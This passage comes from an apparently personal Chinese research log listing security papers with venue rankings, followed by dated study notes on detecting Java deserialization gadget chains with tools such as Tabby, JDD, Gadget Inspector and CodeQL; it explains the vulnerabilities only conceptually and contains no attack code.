MalwareAnalysis</a>(<strong>CCF-A</strong>:TIFS)</li><li><ahref="https://t.cnki.net/kcms/detail?v=7X1a-1n3lSlo7e8SD7MIrB4FNnqSB7t_ePAoPyb7UoHmdjy7X1BnKGJRTP-uE0xthwgZy7oAvyPeohpt27IF1AemI04TB997jyRzzpbNlx1tRRBs7PwTDS05-d4AuiQsZVkR1WkGtsg=&amp;uniplatform=NZKPT">深度学习赋能的恶意代码攻防研究进展</a>《计算机学报-方滨兴》</li><li><ahref="https://www.sohu.com/a/295737605_468736">关于对抗样本恢复的研究</a></li><li><ahref="https://www.secrss.com/articles/19040">深度学习中对抗样本的防御和攻击</a></li><li><ahref="https://www.sciencedirect.com/science/article/pii/S0167404822001572">Adversarialmalware sample generation method based on the prototype of deep learningdetector</a>（<strong>CCF-B</strong>:computer and security）</li><li><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CDFD&amp;dbname=CDFDLAST2022&amp;filename=1020405886.nh&amp;uniplatform=NZKPT&amp;v=xjiG-vadnpzkvu94KN5K6owyE63keKSbdc119t_5nEfUR2a8ZsLu8ytcab9C2gM2">对抗样本技术在恶意软件检测和自动驾驶应用中的研究</a>（湖大-博士论文）</li><li><a href="https://ieeexplore.ieee.org/document/9762803">MsDroid:Identifying Malicious Snippets for Android MalwareDetection</a>（<strong>CCF-A</strong>:TDSC-2022，作者来自浙大）</li><li><a href="https://ieeexplore.ieee.org/document/9477038">BackdoorAttack on Machine Learning Based Android MalwareDetectors</a>（<strong>CCF-A</strong>:TDSC-2022，作者：斯威本科技大学博士）</li><li><a href="https://ieeexplore.ieee.org/document/9484718">DL-FHMC: DeepLearning-Based Fine-Grained Hierarchical Learning Approach for RobustMalware Classification</a>（<strong>CCF-A</strong>:TDSC-2022）</li><li><a href="https://ieeexplore.ieee.org/document/9833659">TranscendingTRANSCEND: Revisiting Malware Classification in the Presence of ConceptDrift</a>（CCF-A会议:IEEE S&amp;P）<br /></li><li><a href="https://ieeexplore.ieee.org/document/9186721">Can We TrustYour Explanations? Sanity Checks for Interpreters in Android MalwareAnalysis</a><spanstyle="background:##ffb86c;font-family:FiraCode;">（TIFS）</span></li><li><ahref="https://t.cnki.net/kcms/detail?v=7X1a-1n3lSlo7e8SD7MIrB4FNnqSB7t_ePAoPyb7UoHmdjy7X1BnKGJRTP-uE0xthwgZy7oAvyPeohpt27IF1AemI04TB997jyRzzpbNlx1tRRBs7PwTDS05-d4AuiQsZVkR1WkGtsg=&amp;uniplatform=NZKPT">深度学习赋能的恶意代码攻防研究进展</a>《计算机学报-方滨兴》</li><li><ahref="https://www.sohu.com/a/295737605_468736">关于对抗样本恢复的研究</a></li><li><ahref="https://www.secrss.com/articles/19040">深度学习中对抗样本的防御和攻击</a></li><li><ahref="https://www.sciencedirect.com/science/article/pii/S0167404822001572">Adversarialmalware sample generation method based on the prototype of deep learningdetector</a>（<strong>CCF会议 B</strong>-computer and security）</li><li><ahref="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CDFD&amp;dbname=CDFDLAST2022&amp;filename=1020405886.nh&amp;uniplatform=NZKPT&amp;v=xjiG-vadnpzkvu94KN5K6owyE63keKSbdc119t_5nEfUR2a8ZsLu8ytcab9C2gM2">对抗样本技术在恶意软件检测和自动驾驶应用中的研究</a>（湖大-博士论文）</li><li><a href="https://ieeexplore.ieee.org/document/9762803">MsDroid:Identifying Malicious Snippets for Android MalwareDetection</a>（<strong>CCF-A</strong>:TDSC-2022，作者来自浙大）</li><li><a href="https://ieeexplore.ieee.org/document/9477038">BackdoorAttack on Machine Learning Based Android MalwareDetectors</a>（<strong>CCF-A</strong>:TDSC-2022，作者：斯威本科技大学博士）</li><li><a href="https://ieeexplore.ieee.org/document/9484718">DL-FHMC: DeepLearning-Based Fine-Grained Hierarchical Learning Approach for RobustMalware Classification</a>（<strong>CCF-A</strong>:TDSC-2022）</li><li><a href="https://ieeexplore.ieee.org/document/9833659">TranscendingTRANSCEND: Revisiting Malware Classification in the Presence of ConceptDrift</a>（<strong>CCF-A会议</strong>:IEEE S&amp;P）</li><li><ahref="https://link.springer.com/article/10.1007/s00521-021-06597-0">Applicationsof deep learning for mobile malware detection: A systematic literaturereview</a>(NCA:人工智能-<strong>CCF-C</strong>)</li><li><a href="https://ieeexplore.ieee.org/document/9964330">A Survey ofAdversarial Attack and Defense Methods for Malware Classification inCyber Security</a>（<strong>中科院JCR分区一区TOP</strong>:IEEECOMMUNICATIONS SURVEYS &amp; TUTORIALS）</li><li><a href="https://www.hindawi.com/journals/scn/2020/8858010/">ASurvey of Automatic Software Vulnerability Detection, Program Repair,and Defect Prediction Techniques</a>（<strong>CCF-C:</strong>Securityand Communication Networks 2020）</li><li><a href="https://dl.acm.org/doi/10.1145/3474553">Efficiency andEffectiveness of web application vulnerability detection approaches: AReview</a> （<a href="https://dl.acm.org/toc/csur/2022/54/9">ACMComputing Surveys</a>：<strong>中科院分区一区top</strong>）</li><li><a href="https://ieeexplore.ieee.org/document/9842744">Can DeepLearning Models Learn the Vulnerable Patterns for VulnerabilityDetection?</a> [<strong>CCF-C</strong>: 2022 IEEE 46th Annual Computers,Software, and Applications Conference (COMPSAC)]</li><li><ahref="https://www.usenix.org/conference/usenixsecurity22/presentation/li-song">MiningNode.js Vulnerabilities via Object Dependence Graph andQuery</a>(<strong>CCF-A</strong>:31st USENIX Security Symposium2022)</li><li><ahref="https://www.sciencedirect.com/science/article/pii/S0167404822004072?via%3Dihub">MFXSS:An effective XSS vulnerability detection method in JavaScript based onmulti-feature model</a>(<strong>CCF-B</strong>:Computers &amp;Security)</li><li><a href="https://dl.acm.org/doi/10.1145/3488932.3497769">OnMeasuring Vulnerable JavaScript Functions in theWild</a>(<strong>CCF-C:</strong>17th AsiaCCS 2022: Nagasaki, Japan)</li><li><ahref="https://www.ndss-symposium.org/ndss-paper/fuzzilli-fuzzing-for-javascript-jit-compiler-vulnerabilities/">FUZZILLI:Fuzzing for JavaScript JIT CompilerVulnerabilities</a>(<strong>CCF-A</strong>会议：NDSS 2023)</li><li><ahref="https://www.ndss-symposium.org/ndss-paper/auto-draft-207/">Probethe Proto: Measuring Client-Side Prototype Pollution Vulnerabilities ofOne Million Real-world Websites</a>(<strong>CCF-A</strong>会议：NDSS2022)</li><li><a href="https://dl.acm.org/doi/10.1145/3468264.3468542">DetectingNode.js prototype pollution vulnerabilities via object lookupanalysis</a>(<strong>CCF-A</strong>:ESEC/SIGSOFT FSE 2021)</li><li><ahref="https://www.computer.org/csdl/proceedings-article/sp/2023/933600b059/1NrbYrQrQ2I">ScalingJavaScript Abstract Interpretation to Detect and Exploit Node.jsTaint-style Vulnerability</a>: <strong>CCF-A</strong>会议：IEEE S&amp;P2023</li><li><ahref="https://www.usenix.org/conference/14th-usenix-security-symposium/finding-security-vulnerabilities-java-applications-static">FindingSecurity Vulnerabilities in Java Applications with Static Analysis</a><strong>CCF-A:</strong>USENIX Security Symposium 2005</li><li><a href="https://dl.acm.org/doi/10.1145/3554732">An In-depth Studyof Java Deserialization Remote-Code Execution Exploits andVulnerabilities.</a>(<strong>CCF-A</strong>:软件工程顶刊：ACMTransactions on Software Engineering and Methodology, Volume 32)</li><li><a href="https://ieeexplore.ieee.org/document/10172888">ImprovingJava Deserialization Gadget Chain Mining via Overriding-Guided ObjectGeneration</a>（程序语言<strong>CCF-A</strong>:2023 IEEE/ACM 45thInternational Conference on Software Engineering (ICSE)）</li><li><code>A Composite Discover Method for Gadget Chains in Java Deserialization Vulnerability</code></li><li><a href="https://ieeexplore.ieee.org/document/10202660">Tabby:Automated Gadget Chain Detection for Java DeserializationVulnerabilities</a>（<strong>CCF-B</strong>会议：DSN2023）</li><li><a href="https://ieeexplore.ieee.org/document/10188756">ImprovingPrecision of Detecting Deserialization Vulnerabilities with BytecodeAnalysis</a>（计算机网络<strong>CCF-B</strong>:31st IWQoS 2023）</li><li><ahref="https://secsys.fudan.edu.cn/ce/78/c26976a642680/page.htm">EfficientDetection of Java Deserialization Gadget Chains via Bottom-up GadgetSearch and Dataflow-aided PayloadConstruction</a>（<strong>CCF-A</strong>: IEEE S&amp;P）</li></ol><h3 id="section">2021-01-06</h3><h4 id="tabby框架学习">tabby框架学习</h4><ol type="1"><li><ahref="https://jf710001011.github.io/2023/12/09/tabby-fen-xi/#toc-heading-10">tabby/core/data/TabbyValue.java</a></li></ol><h4 id="论文">论文</h4><ol type="1"><li><ahref="https://secsys.fudan.edu.cn/ce/78/c26976a642680/page.htm">EfficientDetection of Java Deserialization Gadget Chains via Bottom-up GadgetSearch and Dataflow-aided PayloadConstruction</a>（<strong>CCF-A</strong>: IEEE S&amp;P）</li></ol><h4 id="正文">正文</h4><ol type="1"><li>序列化和反序列化的意义：Java serialization and deserializationgreatly facilitate the cooperation and collaboration of different Javasystems (e.g., server and client), allowing different Java programs toconveniently <strong>exchange and share data and code</strong></li><li><code>Java Object Injection (JOI).</code></li><li>反序列化漏洞的危害：<ol type="1"><li>remote code execution (RCE)</li><li>denial of service (DoS)</li></ol></li><li>现状：<code>ODDFuzz</code> statically searches for possible gadgetsvia a Depth First Search (DFS) strategy, and then dynamically fuzzes thetarget program as a greybox for verifying gadget chains</li><li>top-down static approach:path explosion</li><li>两个指标：effectiveness and efficiency</li><li>ODDFuzz additionally introduced <code>dynamic fuzzing</code> forreducing false positives</li><li>现存问题<ol type="1"><li>path explosion</li><li>In particular, the finegrained data flows between<code>different object fields</code> in each gadget, leading to theimprecision of object structure and thus an incorrect payload.</li></ol></li><li>JDD (Java Deserialization Vulnerability Detector)的特点<ol type="1"><li>JDD first searches for possible <code>gadget fragments</code> andthen chains fragments together from sinks to sources.<ol type="1"><li>观察1： a <code>top-down search</code> repeats the analysis of thesame low-level gadget fragment when a top-level gadget changes, leadingto a huge redundancy and a waste of analysis time</li><li>解决：bottom-up search <code>reuse existing gadget fragments</code>discovered in previous vulnerabilities, which further speeds up thesearch process.</li></ol></li><li>object <code>field relations</code> via a novel data structure,called Injection Object Construction Diagram (IOCD)</li></ol></li><li>summarize the contributions<ol type="1"><li>JDD solves the <code>path explosion problem</code> of static searchfor chained gadgets via a <code>bottom-up approach</code> that discoversintermediate gadget fragments and then chains them together from sinksto sources</li><li>Injection Object Construction Diagram (IOCD)</li><li>Java Naming and Directory Interface (<code>JNDI</code>) injection isa commonly used technique in JOI attacks</li></ol></li><li>JDD的两个目标<ol type="1"><li>Uses static analysis to find potential gadget chains in the victimserver</li><li>Dynamically generates exploitable injection objects to verify theexploitability of gadget chains</li></ol></li><li>Challenge I: Static PathExplosion：？我能理解DFS重复分析fragment，也能理解自上而下的分析方式可以解决这个问题;<strong>但是bottom-up的实际路径计算方式不能理解</strong><ol type="1"><li>top-down(DFS):<imgsrc="https://s2.loli.net/2024/01/06/VNc3ZrjFJ4S8YPi.png"alt="image-20240106025500862" /></li><li>bottom-up<imgsrc="https://s2.loli.net/2024/01/06/8AWJjNcE3lnTeBU.png"alt="image-20240106025608557" /></li></ol></li><li>Challenge II:注入对象涉及变量的层次关系：不能仅仅认为是继承的级别关系，涉及的两个变量也可能是平行并列的关系<ol type="1"><li>作者为此而实现了：<code>Dataflow-aided Construction of Injection Object Construction Diagram (IOCD)</code>.</li></ol></li><li>Identifying Deserialization Entry Points<ol type="1"><li>deserialization methods provided by Java language,e.g.,readObjectNoData(), readExternal() and readObject()</li><li>interfaces provided by popular Java deserialization protocols, e.g.,Map.put() for Hessian protocol.</li></ol></li><li>Related work<ol type="1"><li>GadgetInspector</li><li>Tabby</li><li>SerHybrid [4] proposed to automate the verification of exploitablegadget chains through the construction of <code>heap abstractions</code>for generating injection objects.</li><li><code>GCMiner</code> [1] incorporated an overriding-guided objectgeneration strategy to automate verification during fuzzing.</li><li>ODDFuzz</li><li>black-box scanning tools<ol type="1"><li>Marshalsec [32]</li><li>Java Deserialization Scanner</li></ol></li></ol></li></ol><h4 id="总结">总结</h4><ol type="1"><li>总的来说，这类研究与纯静态分析是有很大不同的。看完这篇论文，能想到与之最像的那必定是文中多次提到的<code>ODDFUZZ</code><ol type="1"><li>JDD与ODDFUZZ都是采用了混合分析（静态分析+动态分析）的方式去检测反序列化漏洞，手法非常类似<ol type="1"><li>静态分析：<ol type="1"><li>建立图</li><li>污点分析寻找利用链</li></ol></li><li>动态分析（<strong>并没有系统学习过</strong>）：<ol type="1"><li>可能需要借助一定的数据结构（例如本文IOCD）</li><li>生成注入对象，触发利用链验证利用链的有效性，减少假阴性</li></ol></li></ol></li></ol></li><li>我着重阅读了<strong>静态分析</strong>部分<ol type="1"><li><strong>疑惑1</strong>：类层次结构（嵌入型还是并列型）研究的意义：我猜测就是类似指针分析的效果，提升分析的精度</li><li>创新之处是：<ol type="1"><li>自底向上的分析方法，解决DFS产生的路径爆炸问题</li><li>提出了Gadget chainfragment的概念（非常有想法），并最终将fragment组合成一条完整的gadgetchain</li></ol></li></ol></li><li>一图总结本文<imgsrc="https://s2.loli.net/2024/01/06/lH61cKJqYy5GX9R.png"alt="image-20240106061533385" /><ol type="1"><li>从目标程序寻找fragment（未分析过）+从已经分析出的fragment（重复使用分析结果）得出fragmentcollection</li><li>将fragment 组合成利用链</li><li>收集约束：存在一定<strong>疑惑</strong>，暂时的理解是自底向上分析时，要触发当前方法因该满足的<strong>条件</strong></li><li>生成注入对象（暂时不清楚原理）</li><li>利用IOCD数据结构辅助验证利用链的有效性</li></ol></li><li>动态分析（也称模糊测试<code>fuzzing</code>），在漏洞检测中确实扮演着非常关键的角色，对于静态分析研究者而言，是一种拓宽思路的技术。但我的研究仍暂以静态分析为重点</li></ol><h3 id="section-1">2023-12-30</h3><h4 id="自动化检测框架学习">自动化检测框架学习</h4><ol type="1"><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-57">Java网络编程</a><ol type="1"><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-58">网络编程基础</a></li><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-59">网络编程的核心套接字Socket</a></li><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-60">Socket实现Http服务器</a></li></ol></li><li><ahref="https://jf710001011.github.io/2023/12/09/tabby-fen-xi/#toc-heading-9">tabby/core/data/TabbySt0atus.java</a></li></ol><h3 id="section-2">2023-12-23</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-52">新特性</a><ol type="1"><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-53">Java8Stream 流</a></li><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-54">Optional最佳指南</a></li><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-55">lambda表达式</a></li><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-56">Java14新特性</a></li></ol></li><li><ahref="https://jf710001011.github.io/2023/12/09/static-analysis-ii/#toc-heading-10">格理论下的数据流分析基础</a></li></ol><h3 id="section-3">2023-12-16</h3><ol type="1"><li>学习：<ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-43">常用工具类</a></li><li>学习：<ahref="https://jf710001011.github.io/2023/12/09/static-analysis-ii/#toc-heading-4">数据流分析及其应用</a></li></ol><h3 id="section-4">2023-12-09</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2023/12/09/java/#toc-heading-40">Java异常机制</a><imgsrc="https://s2.loli.net/2023/12/10/KSwbyaQUW3T6ZVM.png"alt="image-20231209225321575" /></li><li><ahref="https://jf710001011.github.io/2023/12/09/static-analysis-ii/">静态分析再研究</a><imgsrc="https://raw.githubusercontent.com/Jf710001011/pictureBed/main/img/image-20231209225337843.png"alt="image-20231209225337843" /></li></ol><h3 id="section-5">2023-12-02</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2023/08/26/java/#toc-heading-36">JavaIO</a></li><li>tabby 源码分析<ol type="1"><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-7">tabby/core/data/FileLocation.java</a></li><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-8">tabby/core/data/TabbyRule.java</a></li></ol></li></ol><h3 id="section-6">2023-11-19</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-9">tabby分析</a><ol type="1"><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-2">run.sh</a></li><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-4">tabby/core/Analyser.java</a></li><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-5">tabby/core/scanner/CallGraphScanner.java</a></li></ol></li><li>找到一个不错的分析思路<imgsrc="https://s2.loli.net/2023/11/18/w4cLOvbhnT8qfPR.png"alt="image-20231118230811392" /></li></ol><h3 id="section-7">2023-11-11</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2022/09/05/academic-progress/">Tabby/core/container分析</a><imgsrc="https://s2.loli.net/2023/11/12/bZ4omvGEiWakn1s.png"alt="image-20231112124458950" /></li></ol><h4 id="总结-1">总结</h4><ol type="1"><li>首先是对数据（类、方法和类之间的关系）的存储，其次是对数据的使用，内存中查找不到，则从Neo4j图数据库中读取</li><li>对规则的存储和读取，包括类规则和方法规则</li></ol><h3 id="section-8">2023-11-04</h3><h4 id="tabby项目分析">Tabby项目分析</h4><ol type="1"><li>本周主要分析的是：项目的<strong>核心模块：</strong>负责收集待分析的文件或依赖库，解析Java 代码，生成 Soot 模型，进行污点分析，发现可能存在的漏洞<ol type="1"><li>tabby 的核心模块是 Tabby的核心功能所在。该模块主要由以下几个类组成：<ul><li><strong>FileCollector：</strong>负责收集待分析的文件或依赖库。</li><li><strong>Parser：</strong>负责解析 Java 代码，生成 Soot 模型。</li><li><strong>TaintAnalysis：</strong>负责进行污点分析，发现可能存在的漏洞。</li></ul></li></ol></li><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-6">笔记记录</a></li></ol><h4 id="总结-2">总结</h4><ol type="1"><li><code>Tabby</code> 的设计思路主要有以下几点：<ul><li>基于 Soot 实现，支持 Java 代码的静态分析。</li><li>支持多种漏洞挖掘方法，包括反序列化链挖掘、信息泄露检测、代码漏洞检测等。</li><li>支持多种输出格式，包括 HTML、CSV 等</li></ul></li><li>Tabby 的代码组织主要分为以下几个模块：<ul><li><strong>核心模块：</strong>负责收集待分析的文件或依赖库，解析 Java代码，生成 Soot 模型，进行污点分析，发现可能存在的漏洞。</li><li><strong>输出模块：</strong>负责生成报告，展示漏洞信息。</li><li><strong>配置模块：</strong>负责配置 Tabby 的运行参数。</li></ul></li><li>写出这样的项目真的挺难啊：有思路和方法，但是实现出来不容易。</li></ol><h3 id="section-9">2023-10-28</h3><h4 id="论文1">论文1</h4><ol type="1"><li><ahref="https://www.infocomm-journal.com/cjnis/CN/10.11959/j.issn.2096-109x.2022009">基于混合分析的Java反序列化利用链挖掘方法</a></li></ol><h5 id="正文-1">正文</h5><ol type="1"><li>反序列化漏洞三要素：<ol type="1"><li>污染源：攻击者可控的变量；</li><li>入口函数：反序列化时自动调用的接口函数；</li><li>危险函数：能够执行命令的函数。</li></ol></li><li>另外，如果只通过声明类型构造简单调用图，然后在调用图中寻找从入口函数到危险函数的调用链作为反序列化利用链。这种做法将存在大量的误报：<ol type="1"><li><strong>一是</strong>因为根据声明类型构造的调用图不准确，调用关系在实际运行的过程中可能不存在；</li><li><strong>二是</strong>即使调用链存在，如果污点源无法传播到危险函数，调用链也将无法利用</li></ol></li></ol><h4 id="tabby项目分析-1">Tabby项目分析</h4><ol type="1"><li>源自这篇论文：<ahref="https://ieeexplore.ieee.org/document/10202660">Tabby: AutomatedGadget Chain Detection for Java DeserializationVulnerabilities</a>（<strong>CCF-B</strong>会议：DSN2023）</li><li>代码中的<strong>注释</strong>即为我的分析过程</li><li><ahref="https://jf710001011.github.io/2023/10/28/tabby-fen-xi/#toc-heading-1">Tabby分析-记录</a></li></ol><h4 id="总结-3">总结</h4><ol type="1"><li>本周主要是开启对唯一一篇CCF-B中的<strong>项目源码进行分析</strong><ol type="1"><li>全部自己实现是个非常困难的事，需要个参照</li><li>这是第一次对整个项目进行分析</li></ol></li><li>下周结束这个项目分析</li></ol><h3 id="section-10">2023-10-21</h3><ol type="1"><li><ahref="https://jf710001011.github.io/2023/08/26/java/#toc-heading-30">Java反序列化漏洞底层探究记录</a>，包括以下内容<imgsrc="https://s2.loli.net/2023/10/21/etCgaulSrUR7PMz.png"alt="image-20231021225016323" /><ol type="1"><li>两种方式触发漏洞</li><li>利用反射实现利用链</li><li>序列化和反序列化流程分析</li><li>经典利用链分析</li></ol></li></ol><h4 id="总结-4">总结</h4><ol type="1"><li>探究底层原理发现了更多漏洞检测的细节问题，主要是针对这些问题去改进</li><li>我的一个<strong>新想法</strong>：一条完整的利用链包括<code>source()-&gt;中间函数--&gt;sink()</code><ol type="1"><li>一对<code>(source,sink)</code>,有非常多的路线，而我们只是找出有效的利用链。而从source()出发经过的各个中间方法我们无法确定能否到达source,<strong>反其道行之</strong>从sink()出发,逐步向source靠近，将这些可达sink的函数进行<strong>标记</strong>，就可以减少无效的利用链分析</li><li>正如1中所述，主要需要考虑从<code>sink向上标记到第几层</code>，总的来说<code>前向和后向分析</code>可以同时进行提高效率</li></ol></li></ol><h3 id="section-11">2023-10-14</h3><h4 id="论文1-1">论文1</h4><ol type="1"><li><code>A Composite Discover Method for Gadget Chains in Java Deserialization Vulnerability</code>（10thQuASoQ / 6th SEED@APSEC 2022: Virtual）</li></ol><h5 id="正文-2">正文</h5><ol type="1"><li><p>对基于指纹检测的Java反序列化漏洞检测方法</p><p>Java反序列化过程可能存在安全漏洞,通过构造恶意序列化数据可以实施远程代码执行等攻击。为了检测这种漏洞,可以使用基于指纹的方法。</p><p>基本思路是收集已知的可利用的反序列化gadget代码特征,构建一个<code>指纹库</code>。在运行时监控应用的反序列化流量,用指纹库去匹配查看是否包含已知的危险gadget。<strong>匹配到</strong>则表明可能存在可利用的反序列化漏洞。</p><p>这种方法的优点是可以快速检测已知模式的漏洞利用,不需要复杂的代码审计。缺点是指纹库需要维护更新,对未知的0day攻击效果不佳。</p></li><li><p>3个漏洞检测工具</p><ol type="1"><li><strong>Ysoserial:</strong></li><li><strong>Marshalsec:</strong>Marshalsec主要用于生成有效负载，但不包括小工具链的发现功能。</li><li><strong>Java Deserialization Scanner:</strong>这是一个用于检测Java反序列化漏洞的插件，它可以与广泛使用的渗透测试工具BurpSuite集成。该插件利用Ysoserial生成有效负载，用于对反序列化漏洞的目标进行渗透测试和漏洞验证。</li></ol></li><li><p>Gadget Inspector</p></li><li><p><code>fingerprinting-based detection can only detect the presence of known gadget chains in the program,but not unknown gadget chains in the program.</code></p></li><li><p><code>In 2020, Rasheed[13] proposed a hybrid analysis strategy to avoid false positives. It uses static analysis results as a guide for fuzzing.</code></p></li></ol><h4 id="论文2">论文2</h4><ol type="1"><li><a href="https://www.youtube.com/watch?v=wPbW6zQ52w8">AutomatedDiscovery of Deserialization Gadget Chains</a></li></ol><h5 id="正文-3">正文</h5><ol type="1"><li><p><code>ysoserial</code> project and<code>Marshalsec</code>:<code>is a similar project which supports a wider breadth of              12 deserialization libraries, but is again a tool which largely includes known gadget chains.</code></p></li><li><p>The <code>NCC Group Burp Pluginis</code> another 14 Burp Suiteplugin but which is mainly based on the JSON payloads from Muñoz andMirosh’s work.</p></li><li><p><code>joogle</code></p></li><li><p><code>The ASM (Objectweb ASM)</code> library is a popular andwidely-used Java bytecode manipulation framework. It allows developersto analyze and modify Java classes at the bytecode level. ASM provides alow-level, efficient, and flexible way to work with Java class files,making it an essential tool for various applications, including:</p><ol type="1"><li><p><strong>Bytecode Generation:</strong> Developers can use ASM togenerate Java class files programmatically. This is useful for codegeneration, code transformation, and dynamic class creation.</p></li><li><p><strong>Code Analysis:</strong> ASM can be used to analyzeexisting Java class files. It allows you to inspect the structure ofclasses, methods, fields, and instructions, making it valuable for toolslike code analyzers and documentation generators.</p></li><li><p><strong>Code Transformation:</strong> ASM enables themodification of existing class files, allowing you to inject code, addor remove methods, and change class structures. This is often used inframeworks and libraries that need to instrument or modify classesduring runtime.</p></li><li><p><strong>Performance Enhancements:</strong> Some applications useASM to optimize Java bytecode for better performance. This can includeinlining, method call optimizations, and other bytecode-levelimprovements.</p></li><li><p><strong>Java Agents:</strong> ASM is commonly used in Javaagents, which are Java programs that can be dynamically attach torunning Java applications to instrument and monitor them. Agents can beused for profiling, logging, and other runtime analysis.</p></li><li><p><strong>Aspect-Oriented Programming (AOP):</strong> ASM issometimes used in AOP frameworks to weave aspect code into classes atthe bytecode level. This allows developers to separate cross-cuttingconcerns, such as logging or security, from the main applicationlogic.</p></li></ol><p>ASM is known for its small footprint, high performance, and theability to work with different versions of Java class files. It offersboth a simple and a more complex API, making it suitable for a widerange of use cases, from simple class file generation to advancedbytecode manipulation.</p><p>If you are working on projects that require Java bytecodemanipulation, ASM is a powerful and versatile library that can help youachieve your goals. It's often used in conjunction with other tools andlibraries for specific tasks like code generation, optimization, orinstrumentation.</p></li><li><p>How Gadget Inspector <strong>Works</strong></p><ol type="1"><li>Class and Method Hierarchy Enumeration</li></ol></li></ol><h4 id="总结-5">总结</h4><ol type="1"><li><p>在查询语言上进行优化使用<code>Codeql</code>:</p><p>CodeQL查询语言是CodeQL用于编写代码分析查询规则的语言,具有以下主要特点:</p><ol type="1"><li>基于逻辑查询:查询以类似SQL的逻辑语句组织,例如选择、联接等。</li><li>支持面向对象:可以直接作用于类、对象、方法等。</li><li>路径敏感:可以精确捕获代码执行路径。</li><li>数据流分析:可以跟踪数据流动,寻找问题。</li><li>支持聚合:可以聚合和分组结果。</li><li>丰富的APIs:提供访问AST、控制流图、调用关系等程序结构信息的API。</li><li>可扩展:可以导入其他语言写的库。</li><li>可组合:查询可以组合使用。</li><li>注释支持:可以在查询中加入注释说明。</li><li>良好的IDE支持:如VS Code插件。</li></ol></li><li><p>一个检测工具需要满足的<strong>特点</strong>参考-设计指南：</p><ol type="1"><li>确定类路径上存在的 gadget链漏洞：工具应该能够检测类路径中可能存在的潜在 gadget 链漏洞。</li><li>评估漏洞的影响：工具应该能够评估这些漏洞的影响，包括可能导致的安全问题，如RCE、SSRF 和 DoS。</li><li>提供保守的影响评估：工具应该提供限制性的、谨慎的漏洞影响评估，以确保不低估漏洞的危害程度。</li><li>适用于整个类路径：工具应该能够轻松操作应用程序的整个类路径，无论应用程序中使用的编程语言是什么。如果应用程序使用多种源语言，工具应该能够在Java 字节码上运行。</li><li>理解不同反序列化库：工具应该能够理解和适应不同的反序列化库，了解每个库对gadget 链的限制，以便更好地检测漏洞。</li></ol></li><li><p>下一个计划：</p><ol type="1"><li>研究几个经典的反序列化漏洞案例，把握漏洞特征，针对特定的问题，设计对应的解决策略</li><li>重点在设计方法调用图和数据流图上</li></ol></li></ol><h3 id="section-12">2023-10-07</h3><h4 id="java反射">Java反射</h4><ol type="1"><li><ahref="https://jf710001011.github.io/2023/08/26/java/#toc-heading-29">JAVA反射记录</a><imgsrc="https://s2.loli.net/2023/10/07/W6hYOL2gpAGuaZ3.png"alt="image-20231007221736659" /></li><li>JAVA反射是JAVA一个非常重要的特性，机制复杂，出现安全的问题也更加复杂，是一个非常值得关注的点</li></ol><h4 id="论文1-2">论文1</h4><ol type="1"><li><p><a href="https://ieeexplore.ieee.org/document/10188756">ImprovingPrecision of Detecting Deserialization Vulnerabilities with BytecodeAnalysis</a>（计算机网络<strong>CCF-B</strong>:31st IWQoS 2023）</p><ol type="1"><li><p>作者：广州大学网络空间安全学院</p></li><li><p>Index Terms：</p><p>Security and Protection,</p><p>Web Servers,</p><p>Program Analysis,</p><p>Java.</p></li></ol></li></ol><h5 id="正文-4">正文</h5><ol type="1"><li><p><code>JNDI（Java Naming and Directory Interface）</code>注入是一种安全漏洞，通常出现在Java应用程序中，特别是那些使用JNDI来连接和管理命名和目录服务的应用程序中。JNDI是Java中用于访问命名和目录服务的API，允许应用程序查找和访问各种资源，如数据库连接、消息队列等。</p><p>JNDI注入<code>发生在</code>攻击者能够控制或影响JNDI查找的输入时。攻击者可以通过恶意构造的JNDI名称或URL，迫使应用程序加载和执行不安全的类或代码。这可能导致严重的安全问题，包括远程代码执行、信息泄露或拒绝服务攻击。</p><p>通常，JNDI注入漏洞的利用方式包括将恶意的JNDI名称传递给应用程序，然后应用程序试图查找这个名称，最终执行了攻击者控制的恶意代码。</p></li><li><p><code>Static analysis based on bytecode analysis, such as GadgetInspector [1] and GadgetSearch [2], is the most popular measure to detect deserialization vulnerabilities</code></p></li><li><p><code>Java反射（Reflection）</code>是一种高级编程技术，允许在运行时检查、获取和操作类、对象、方法、字段等程序元素的信息。反射提供了一种强大的机制，使开发人员能够在运行时获取类的信息、创建对象、调用方法和访问字段，而不需要在编译时知道这些信息。</p><p>以下是Java反射的一些关键概念和用法：</p><ol 